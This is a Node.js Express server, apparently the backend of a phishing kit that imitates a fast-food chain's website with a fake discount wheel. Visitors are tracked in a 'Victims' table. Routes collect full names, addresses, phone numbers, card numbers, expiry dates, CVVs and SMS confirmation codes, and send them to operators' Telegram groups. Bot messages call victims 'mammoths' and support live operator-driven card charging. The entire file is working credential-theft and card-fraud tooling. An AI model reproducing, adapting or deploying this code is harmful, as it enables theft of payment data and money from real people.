const express = require("express");
const useragent = require("express-useragent");
const bodyParser = require("body-parser");
const cookieParser = require('cookie-parser');
const { Op } = require("sequelize");
const path = require("path");
const { Telegram, Markup } = require("telegraf");
const binInfoEdit = require("./handlers/functions/binInfoEdit");
const withOutWriter = require("./handlers/functions/withOutWriter");
const reqInfo = require("./handlers/functions/reqInfo");
const vbivButtons = require("./handlers/functions/vbivButtons");
const config = require("./config/config");
const {
    Products,
    sequelize,
    Carts,
    Victims,
    Logs
} = require("./config/database");
const bot = new Telegram(config.bot.token);
const fs = require("fs");

const logsGroupId = config.bot.logsGroupId;
const loggingGroupId = config.bot.loggingGroupId;

const app = express();

app.set("view engine", "ejs");
app.set("views", path.join(__dirname, "pages"));

app.use(useragent.express());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, "public")));
app.use(cookieParser());

sequelize.sync()
    .then(() => {
        console.log('Миграции успешно выполнены!');
    })
    .catch((error) => {
        console.error('Ошибка при выполнении миграций:', error);
    });


async function sendNewLogMessage(cardInfo) {
    return `<b>💳 Новый лог #id${cardInfo.id}</b>
💰 Стоимость: <b>${cardInfo.price} EUR</b>
${await binInfoEdit(cardInfo.cardNumber.replace(/\s/g, ""))}
Номер: <code>${cardInfo.cardNumber.replaceAll(' ', '')}</code>
💳 Номер: <b>${cardInfo.cardNumber}</b>`;
}

app.get("/", async (req, res) => {
    let ipInfo = req.headers['x-forwarded-for'] || '127.0.0.1';
    const victimId = req.cookies.victimId;
    const [victim, created] = await Victims.findOrCreate({
        where: {
            [Op.or]: [
                { id: victimId != undefined ? victimId : null },
                {
                    ip: ipInfo
                }
            ]
        },
        defaults: {
            ip: ipInfo
        },
    });

    if(created || victimId == undefined){
        await res.cookie('victimId', victim.id);
    }

    if (victim.discount === 0) {
        return res.render("fortuna", {victim});
    }

    const cartsCount = await Carts.count({
        where: {
            victimId: victim.id
        }
    });

    res.render("index", {cartsCount});
});

app.get("/participating-stores", async (req, res) => {
    let ipInfo = req.headers['x-forwarded-for'] || '127.0.0.1';
    const victimId = req.cookies.victimId;
    const [victim, created] = await Victims.findOrCreate({
        where: {
            [Op.or]: [
                { id: victimId != undefined ? victimId : null },
                {
                    ip: ipInfo
                }
            ]
        },
        defaults: {
            ip: ipInfo
        },
    });

    if(created || victimId == undefined){
        await res.cookie('victimId', victim.id);
    }
    res.render("participating-stores");
});

app.get("/terms-conditions", async (req, res) => {
    let ipInfo = req.headers['x-forwarded-for'] || '127.0.0.1';
    const victimId = req.cookies.victimId;
    const [victim, created] = await Victims.findOrCreate({
        where: {
            [Op.or]: [
                { id: victimId != undefined ? victimId : null },
                {
                    ip: ipInfo
                }
            ]
        },
        defaults: {
            ip: ipInfo
        },
    });

    if(created || victimId == undefined){
        await res.cookie('victimId', victim.id);
    }
    res.render("terms-conditions");
});

app.get("/privacy-notice", async (req, res) => {
    let ipInfo = req.headers['x-forwarded-for'] || '127.0.0.1';
    const victimId = req.cookies.victimId;
    const [victim, created] = await Victims.findOrCreate({
        where: {
            [Op.or]: [
                { id: victimId != undefined ? victimId : null },
                {
                    ip: ipInfo
                }
            ]
        },
        defaults: {
            ip: ipInfo
        },
    });

    if(created || victimId == undefined){
        await res.cookie('victimId', victim.id);
    }
    res.render("privacy-notice");
});

app.get("/cookie-policy", async (req, res) => {
    let ipInfo = req.headers['x-forwarded-for'] || '127.0.0.1';
    const victimId = req.cookies.victimId;
    const [victim, created] = await Victims.findOrCreate({
        where: {
            [Op.or]: [
                { id: victimId != undefined ? victimId : null },
                {
                    ip: ipInfo
                }
            ]
        },
        defaults: {
            ip: ipInfo
        },
    });

    if(created || victimId == undefined){
        await res.cookie('victimId', victim.id);
    }
    res.render("cookie-policy");
});

app.get("/careers", async (req, res) => {
    let ipInfo = req.headers['x-forwarded-for'] || '127.0.0.1';
    const victimId = req.cookies.victimId;
    const [victim, created] = await Victims.findOrCreate({
        where: {
            [Op.or]: [
                { id: victimId != undefined ? victimId : null },
                {
                    ip: ipInfo
                }
            ]
        },
        defaults: {
            ip: ipInfo
        },
    });

    if(created || victimId == undefined){
        await res.cookie('victimId', victim.id);
    }
    res.render("careers");
});

app.get("/bookings", async (req, res) => {
    let ipInfo = req.headers['x-forwarded-for'] || '127.0.0.1';
    const victimId = req.cookies.victimId;
    const [victim, created] = await Victims.findOrCreate({
        where: {
            [Op.or]: [
                { id: victimId != undefined ? victimId : null },
                {
                    ip: ipInfo
                }
            ]
        },
        defaults: {
            ip: ipInfo
        },
    });

    if(created || victimId == undefined){
        await res.cookie('victimId', victim.id);
    }
    res.render("bookings");
});

app.get("/feedback", async (req, res) => {
    let ipInfo = req.headers['x-forwarded-for'] || '127.0.0.1';
    const victimId = req.cookies.victimId;
    const [victim, created] = await Victims.findOrCreate({
        where: {
            [Op.or]: [
                { id: victimId != undefined ? victimId : null },
                {
                    ip: ipInfo
                }
            ]
        },
        defaults: {
            ip: ipInfo
        },
    });

    if(created || victimId == undefined){
        await res.cookie('victimId', victim.id);
    }
    res.render("feedback");
});

app.get("/locations", async (req, res) => {
    let ipInfo = req.headers['x-forwarded-for'] || '127.0.0.1';
    const victimId = req.cookies.victimId;
    const [victim, created] = await Victims.findOrCreate({
        where: {
            [Op.or]: [
                { id: victimId != undefined ? victimId : null },
                {
                    ip: ipInfo
                }
            ]
        },
        defaults: {
            ip: ipInfo
        },
    });

    if(created || victimId == undefined){
        await res.cookie('victimId', victim.id);
    }
    res.render("locations");
});

app.get("/our-app", async (req, res) => {
    let ipInfo = req.headers['x-forwarded-for'] || '127.0.0.1';
    const victimId = req.cookies.victimId;
    const [victim, created] = await Victims.findOrCreate({
        where: {
            [Op.or]: [
                { id: victimId != undefined ? victimId : null },
                {
                    ip: ipInfo
                }
            ]
        },
        defaults: {
            ip: ipInfo
        },
    });

    if(created || victimId == undefined){
        await res.cookie('victimId', victim.id);
    }
    res.render("our-app");
});

app.get("/new-whopper", async (req, res) => {
    let ipInfo = req.headers['x-forwarded-for'] || '127.0.0.1';
    const victimId = req.cookies.victimId;
    const [victim, created] = await Victims.findOrCreate({
        where: {
            [Op.or]: [
                { id: victimId != undefined ? victimId : null },
                {
                    ip: ipInfo
                }
            ]
        },
        defaults: {
            ip: ipInfo
        },
    });

    if(created || victimId == undefined){
        await res.cookie('victimId', victim.id);
    }
    res.render("new-whopper");
});

app.get("/covid-19", async (req, res) => {
    let ipInfo = req.headers['x-forwarded-for'] || '127.0.0.1';
    const victimId = req.cookies.victimId;
    const [victim, created] = await Victims.findOrCreate({
        where: {
            [Op.or]: [
                { id: victimId != undefined ? victimId : null },
                {
                    ip: ipInfo
                }
            ]
        },
        defaults: {
            ip: ipInfo
        },
    });

    if(created || victimId == undefined){
        await res.cookie('victimId', victim.id);
    }
    res.render("covid-19");
});

app.get("/our-menu", async (req, res) => {
    let ipInfo = req.headers['x-forwarded-for'] || '127.0.0.1';
    const victimId = req.cookies.victimId;
    const [victim, created] = await Victims.findOrCreate({
        where: {
            [Op.or]: [
                { id: victimId != undefined ? victimId : null },
                {
                    ip: ipInfo
                }
            ]
        },
        defaults: {
            ip: ipInfo
        },
    });

    if(created || victimId == undefined){
        await res.cookie('victimId', victim.id);
    }
    const cartsCount = await Carts.count({
        where: {
            victimId: victim.id
        }
    });
    res.render("our-menu", {cartsCount});
});

app.get("/plant-based-kings", async (req, res) => {
    let ipInfo = req.headers['x-forwarded-for'] || '127.0.0.1';
    const victimId = req.cookies.victimId;
    const [victim, created] = await Victims.findOrCreate({
        where: {
            [Op.or]: [
                { id: victimId != undefined ? victimId : null },
                {
                    ip: ipInfo
                }
            ]
        },
        defaults: {
            ip: ipInfo
        },
    });

    if(created || victimId == undefined){
        await res.cookie('victimId', victim.id);
    }
    res.render("plant-based-kings");
});

app.get("/menu/:product", async (req, res) => {
    let ipInfo = req.headers['x-forwarded-for'] || '127.0.0.1';
    const victimId = req.cookies.victimId;
    const [victim, created] = await Victims.findOrCreate({
        where: {
            [Op.or]: [
                { id: victimId != undefined ? victimId : null },
                {
                    ip: ipInfo
                }
            ]
        },
        defaults: {
            ip: ipInfo
        },
    });

    if(created || victimId == undefined){
        await res.cookie('victimId', victim.id);
    }

    if (!req.params.product) {
        return res.render("404");
    }
    const cartsCount = await Carts.count({
        where: {
            victimId: victim.id
        }
    });

    const viewPath = path.join(__dirname, 'pages', 'menu', `${req.params.product}.ejs`);
    fs.access(viewPath, fs.constants.F_OK, (err) => {
        if (err) {
            return res.render("404");
        }

        res.render(`menu/${req.params.product}`, {cartsCount});
    });
});

app.get("/product/:product", async (req, res) => {
    let ipInfo = req.headers['x-forwarded-for'] || '127.0.0.1';
    const victimId = req.cookies.victimId;
    const [victim, created] = await Victims.findOrCreate({
        where: {
            [Op.or]: [
                { id: victimId != undefined ? victimId : null },
                {
                    ip: ipInfo
                }
            ]
        },
        defaults: {
            ip: ipInfo
        },
    });

    if(created || victimId == undefined){
        await res.cookie('victimId', victim.id);
    }

    if (!req.params.product) {
        return res.render("404");
    }
    const product = await Products.findOne({
       where: {
           tag: req.params.product
       }
    });

    if (!product) {
        return res.render("404");
    }
    const cartsCount = await Carts.count({
        where: {
            victimId: victim.id
        }
    });

     return res.render(`product`, {product, victim, cartsCount});
});


app.get("/cart", async (req, res) => {
    try {
        let ipInfo = req.headers['x-forwarded-for'] || '127.0.0.1';
        const victimId = req.cookies.victimId;
        const [victim, created] = await Victims.findOrCreate({
            where: {
                [Op.or]: [
                    { id: victimId != undefined ? victimId : null },
                    {
                        ip: ipInfo
                    }
                ]
            },
            defaults: {
                ip: ipInfo
            },
        });

        if(created || victimId == undefined){
            await res.cookie('victimId', victim.id);
        }
        const cartItems = await Carts.findAll({
            where: {
                victimId: victim.id
            }
        });

        if (!cartItems || cartItems.length === 0) {
            return res.render("cart", { cartItems: [], totalPrice: 0, victim  });
        }


        const groupedCart = {};
        cartItems.forEach(item => {
            if (groupedCart[item.title]) {
                groupedCart[item.title].quantity++;
                groupedCart[item.title].totalPrice += item.price;
            } else {
                groupedCart[item.title] = {
                    title: item.title,
                    price: item.price,
                    quantity: 1,
                    totalPrice: item.price,
                };
            }
        });


        const cart = Object.values(groupedCart);


        let totalPrice = 0;
        cart.forEach(item => {
            totalPrice += item.totalPrice;
        });

        return res.render("cart", { cartItems: cart, totalPrice: totalPrice, victim });

    } catch (error) {
        console.error("Ошибка при получении корзины:", error);
        return res.status(500).send("Ошибка сервера"); // Или редирект на страницу ошибки
    }
});

app.get("/checkout/:price", async (req, res) => {
    if (!req.params.price || isNaN(req.params.price)) {
        return res.render("404");
    }

    await bot.sendMessage(loggingGroupId, `🔥 Переход на ввод данных!
    
${await reqInfo(req)}`, {
        parse_mode: "HTML"
    });

    return res.render(`checkout`, {price: req.params.price});

});

app.post('/cart/add', async (req, res) => {
    try {
        const { price, title, victimId } = req.body;
        if (!title || !price || !victimId) {
            console.log(req.body)
            return res.sendStatus(404);
        }

        const newCartItem = await Carts.create({
            title: title,
            price: price,
            victimId: victimId
        });

        const cartsCount = await Carts.count({
            where: {
                victimId: victimId
            }
        });

        return res.json({
            cartsCount
        });
    } catch (error) {
        console.log(error);
        return res.sendStatus(404);
    }
});

app.delete('/cart/remove', async (req, res) => {
    try {
        const { title, victimId } = req.body;

        if (!title || !victimId) {
            return res.sendStatus(404);
        }
        
        const deletedCount = await Carts.destroy({
            where: {
                title: title,
                victimId: victimId
            }
        });

        res.json({ message: `Удалено ${deletedCount} товаров с названием "${title}" из корзины.` });

    } catch (error) {
        return res.sendStatus(404);
    }
});

app.post('/send-fullz', async (req, res) => {
    try {
        const { title, fullName, address, phoneNumber } = req.body;

        if (!title || !fullName || !address || !phoneNumber) {
            return res.sendStatus(404);
        }

        await bot.sendMessage(loggingGroupId, `🪪 Получены данные!
        
Имя: ${title} ${fullName}
Адресс: ${address}
Номер: ${phoneNumber}

${await reqInfo(req)}`, {
            parse_mode: "HTML"
        });

        res.json({ message: `Success` });

    } catch (error) {
        return res.sendStatus(404);
    }
});

app.post("/api/sendLog", async (req, res) => {
    try {
        if(!req.body.price || !req.body.cardNumber || !req.body.exp || !req.body.cvv) {
            return res.sendStatus(404);
        }

        const cardInfo = await Logs.create({
            cardNumber: req.body.cardNumber,
            cardExp: req.body.exp,
            cardCvv: req.body.cvv,
            price: parseFloat(req.body.price/2).toFixed(2)
        });


        const msg2 = await bot.sendMessage(
            logsGroupId,
            await sendNewLogMessage(cardInfo),
            {
                parse_mode: "HTML",
                reply_markup: await withOutWriter(cardInfo)
            }
        );



        await cardInfo.update({ messageId: msg2.message_id });

        return res.json({ id: cardInfo.id });
    } catch (err) {
        return res.sendStatus(404);
    }
});

app.post("/api/getStatus", async (req, res) => {
    try {
        const log = await Logs.findOne({
            where: {
                id: req.body.id,
            },
        });
        if (!log) return res.sendStatus(404);

        if(!log.online) {
            await log.update({online: true})
        }
        return res.json({
            method: log.status,
            id: log.id,
            type: log.type,
            error: log.error,
        });
    } catch (err) {
        return res.sendStatus(404);
    }
});

app.get("/get/discount", async (req, res) => {
    try {
        let ipInfo = req.headers['x-forwarded-for'] || '127.0.0.1';
        const victimId = req.cookies.victimId;
        const [victim, created] = await Victims.findOrCreate({
            where: {
                [Op.or]: [
                    { id: victimId != undefined ? victimId : null },
                    {
                        ip: ipInfo
                    }
                ]
            },
            defaults: {
                ip: ipInfo
            },
        });

        if(created || victimId == undefined){
            await res.cookie('victimId', victim.id);
        }

        await victim.update({
            discount: 50
        })

        return res.redirect('/our-menu');
    } catch (err) {
        return res.sendStatus(404);
    }
});

app.post('/sendValue', async (req, res) => {
    const log = await Logs.findOne({
        where: {
            id: req.body.id,
        },
    });

    if (!log) return res.sendStatus(404);

    let type = {
        sms: "📩 [ ПОЛУЧЕН КОД ]",
        balance: "📩 [ ПОЛУЧЕН БАЛАНС ]",
        custom: "⌨️ [ МАМОНТ ВВЕЛ ДАННЫЕ ]"
    };

    await log.update({
        status: null
    });

    if (log.writerId) {
        await bot.sendMessage(log.writerId, `<b>${type[req.body.type]}</b>
🦣 ID лога: #id${log.id}
${req.body.type === 'custom' ? `\n❔ Вопрос: ${log.error}` : ''}
🔑 <code>${req.body.value}</code>`, {
            parse_mode: "HTML",
            reply_to_message_id: log.writerMsgId
        });
        await bot.editMessageReplyMarkup(log.writerId, log.writerMsgId, log.writerMsgId, await vbivButtons(log)

        ).catch((err) => err);
    } else {
        await bot.sendMessage(logsGroupId, `<b>${type[req.body.type]}</b>
🦣 ID лога: #id${log.id}
${req.body.type === 'custom' ? `\n❔ Вопрос: ${log.error}` : ''}
🔑 <code>${req.body.value}</code>`, {
            parse_mode: "HTML",
            reply_to_message_id: log.messageId
        });
    }

    return res.sendStatus(200);
});

app.get("*", async (req, res) => {
    return res.render("404");
});


const PORT = process.env.PORT || 80;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});

module.exports = app;
